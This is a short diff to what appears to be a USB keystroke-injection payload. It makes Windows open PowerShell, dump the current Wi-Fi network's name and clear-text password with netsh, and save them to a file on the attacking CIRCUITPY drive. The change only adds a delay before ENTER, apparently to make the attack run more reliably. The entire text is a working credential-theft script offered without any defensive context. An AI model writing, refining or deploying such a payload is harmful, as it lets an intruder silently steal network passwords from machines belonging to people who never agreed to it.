@@ -4,6 +4,7 @@ DELAY 2000
 GUI r
 DELAY 100
 STRING powershell "$m=(Get-Volume -FileSystemLabel 'CIRCUITPY').DriveLetter;netsh wlan show profile name=(Get-NetConnectionProfile).Name key=clear|?{$_-match'SSID n|Key C'}|%{($_ -split':')[1]}>>$m':\'$env:computername'.txt'"
+DELAY 250
 ENTER
 
 
